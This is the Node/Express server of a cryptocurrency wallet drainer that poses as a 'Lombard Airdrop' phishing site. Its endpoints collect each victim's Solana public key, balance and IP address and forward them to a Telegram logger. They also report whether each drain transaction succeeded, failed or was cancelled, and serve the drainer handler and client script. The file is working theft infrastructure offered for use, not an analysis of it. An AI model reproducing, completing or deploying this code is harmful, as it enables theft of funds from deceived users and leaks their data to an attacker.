import 'dotenv/config';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import drainerHandler from './api/drainer.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API Routes - Specific routes first
app.post('/api/drainer/log-wallet', async (req, res) => {
  // Add CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  try {
    console.log('[SERVER] Request method:', req.method);
    console.log('[SERVER] Request URL:', req.url);
    console.log('[SERVER] Request body type:', typeof req.body);
    console.log('[SERVER] Request body:', req.body);
    console.log('[SERVER] Request headers:', req.headers);
    console.log('[SERVER] Content-Type header:', req.headers['content-type']);
    
    // Check if body is empty or malformed
    if (!req.body || typeof req.body !== 'object') {
      console.error('[SERVER] Invalid request body:', req.body);
      return res.status(400).json({ error: 'Invalid request body' });
    }
    
    const { publicKey, walletType, origin, userAgent, lamports } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Validate required fields
    if (!publicKey) {
      console.error('[SERVER] Missing publicKey in request');
      return res.status(400).json({ error: 'Missing publicKey' });
    }
    
    console.log('[SERVER] Received wallet log request:', {
      publicKey: publicKey,
      walletType: walletType,
      lamports: lamports,
      ip: userIp
    });
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    // Log wallet detection (this will be called from frontend)
    await telegramLogger.logWalletDetected({
      publicKey: publicKey,
      lamports: lamports || 0, // Accept balance from frontend
      ip: userIp,
      walletType: walletType || 'Unknown'
    });
    
    console.log('[SERVER] Wallet logging successful');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[SERVER] Error logging wallet connection:', error);
    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
  }
});

// OPTIONS route for wallet logging
app.options('/api/drainer/log-wallet', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.status(200).end();
});

// Main drainer routes
app.get('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

app.post('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

app.options('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

// On-chain confirmation logging endpoint
app.post('/api/drainer/log-confirmation', async (req, res) => {
  try {
    console.log('[CONFIRMATION] Received confirmation request:', req.body);
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
      console.log('[CONFIRMATION] Logging successful confirmation for:', publicKey, txid, 'status:', status);
      await telegramLogger.logDrainSuccess({
        publicKey: publicKey,
        actualDrainAmount: 0, // Will be calculated from transaction
        lamports: req.body.lamports || 0,
        ip: userIp
      });
    } else if (error) {
      console.log('[CONFIRMATION] Logging failed confirmation for:', publicKey, txid, error);
      await telegramLogger.logDrainFailed({
        publicKey: publicKey,
        lamports: req.body.lamports || 0,
        ip: userIp,
        error: error || 'Transaction failed on-chain'
      });
    } else {
      console.log('[CONFIRMATION] Unknown status:', status, 'for:', publicKey, txid);
    }
    
    console.log('[CONFIRMATION] Confirmation logged successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CONFIRMATION] Error logging confirmation:', error);
    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
  }
});

// Transaction cancellation logging endpoint
app.post('/api/drainer/log-cancellation', async (req, res) => {
  try {
    console.log('[CANCELLATION] Received cancellation request:', req.body);
    const { publicKey, walletType, reason } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    await telegramLogger.logTransactionCancelled({
      publicKey: publicKey,
      walletType: walletType || 'Unknown',
      reason: reason || 'User cancelled transaction',
      lamports: req.body.lamports || 0,
      ip: userIp
    });
    
    console.log('[CANCELLATION] Cancellation logged successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CANCELLATION] Error logging cancellation:', error);
    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
  }
});

// Static file routes
app.get('/logo.png', (req, res) => {
  res.setHeader('Content-Type', 'image/png');
  res.sendFile(path.join(__dirname, 'public', 'logos', 'logo.png'));
});

app.get('/logos/:logo', (req, res) => {
  const logoFile = req.params.logo;
  res.sendFile(path.join(__dirname, 'public', 'logos', logoFile));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 Lombard Airdrop: http://localhost:${PORT}`);
  console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/drainer`);
  console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
}); 